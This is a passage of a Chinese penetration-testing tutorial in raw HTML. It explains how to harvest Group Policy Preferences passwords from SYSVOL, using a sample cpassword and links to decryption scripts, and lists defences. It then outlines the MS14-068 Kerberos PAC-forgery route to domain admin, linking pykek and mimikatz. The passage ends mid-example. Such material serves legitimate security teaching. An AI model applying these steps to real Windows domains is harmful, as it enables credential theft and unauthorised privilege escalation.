style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.8992443324937027" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/5_SloicuIQrAR0M5rN1f01MrYQyvTruQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV0icU6EeqxmibR0LH5BXc4hrHEQMSloicuIQrAR0M5rN1f01MrYQyvTruQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="794" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">域服务器一般都会共享这个文件夹，或者搜索当前机器下的XML文件将包含凭据：groups.xml，scheduledtasks.xml，services.xml中，datasources.xml。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">映射驱动（Drives.xml）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">数据源（DataSources.xml）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">打印机配置（Printers.xml）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">创建/更新服务（services.xml中）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">计划任务（ScheduledTasks.xml）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.36503067484662577" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/6_c5FpJZEBaYtogG5smDATJymU7mETEA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVI4CB0AMReReKr9k2kYhMhl5Iic5FpJZEBaYtogG5smDATJymU7mETEA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="652" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">由于经过身份验证的用户（任何域用户或受信任域中的用户）具有对SYSVOL的读取权限</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">\192.168.50.205sysvolpentest.comPolicies{84017B64-2662-4BA3-A06C-FB953CCBE92D}UserPreferencesGroups.xml</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.13191489361702127" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/7_c4WGiaHLKh6JQ4Srs0FL0RHTlYdGmg.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVpFIqicicyPNX5Z8MCS1RhKym9RFic4WGiaHLKh6JQ4Srs0FL0RHTlYdGmg/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1410" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">经过AES-256位加密</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs ini" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">cpassword=<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"fUCMHAw9I2PdYRZEBMS54IvtPHX3ni44qRkWtfBtxoA"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">可以使用AES私钥解密GPP密码</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">微软在MSDN上发布了AES加密密钥（共享密钥）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用PowerShell的脚本解密</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.5252525252525253" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/8_sWHZF7ZaNN51QrX02pI8IZZZpGDDUw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVmZE0ib6FvOnNwM2PdbCqBxOGxsWHZF7ZaNN51QrX02pI8IZZZpGDDUw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1188" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://www.freebuf.com/vuls/92016.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Windows Server 2008 R2之四管理Sysvol文件夹</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://blog.51cto.com/ycrsjxy/203095</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">SYSVOL中查找密码并利用组策略首选项</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=2288</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">利用SYSVOL还原组策略中保存的密</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://xianzhi.aliyun.com/forum/topic/1653/?accounttraceid=c4c9a768-4a9f-42f8-b1e1-f8707574eeb9</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">防：</span></p><ul style="" class=" list-paddingleft-2"><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">在用于管理GPO的计算机上安装KB2962486，以防止将新凭据置于组策略首选项中。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">设置每个人访问权限</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">不在组策略中使用域控密码</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">设置共享文件夹SYSVOL的访问权限</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">删除现有的GPP里包含密码的XML文件。</span></p></li></ul><h3 name="h3-3" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">MS14-068 Kerberos</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Kerberos的是西方神话中守卫地狱之门的三头犬的名字。只所以使用这个名字是因为Kerberos的需要三方的共同参与，才能完成一次事务处理。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Kerberos是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证。相互认证或请求服务的实体被称为委托人（principal）。参与的中央服务器被称为密钥分发中心（简称KDC）.KDC有两个服务组成：身份验证服务（认证服务器，简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。在Windows域环境下，身份验证服务和票据授予服务可同时运行在任何可写域控服务器上。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">更多阅读：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">的Kerberos协议的滥用</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://www.freebuf.com/articles/system/45631.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Kerberos的的工作原理</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://adsecurity.org/?p=227</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">最根本的问题在于权限属性证书可以被伪造，权限属性证书中存储帐号用户名，ID，组成员等信息，掌握域用户一些基本信息就可以获取域管理员权限</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">攻击者可以有效地重写有效的Kerberos TGT身份验证票据，使其成为域管理员（和企业管理员）</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/bidord/pykek/archive/master.zip</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/gentilkiwi/mimikatz/releases/</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">apt-get <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">install</span> krb5-<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">user</span>apt-<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">get</span> <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">install</span> rdate</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">MS14-068过程：</span></p><ul style="" class=" list-paddingleft-2"><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">请求没有PAC的Kerberos TGT认证票据作为标准用户，DC回复TGT</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">生成一个伪造的PAC，没有密钥，所以生成的PAC使用域用户的密码数据用MD5算法而不是HMAC_MD5“签名”。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">作为TGS服务票据请求的一部分，使用伪造的PAC作为授权数据发送无PAC的TGT到DC。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">DC似乎被这个混淆了，所以它放弃了用户发送的不含PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到它自己的授权数据中，并将这个TGT发送给用户。</span></p></li><li><p><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">这个伪造PAC的TGT使得用户可以成为易受攻击的DC上的域管理员。</span></p></li></ul><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">whoami</span> /user

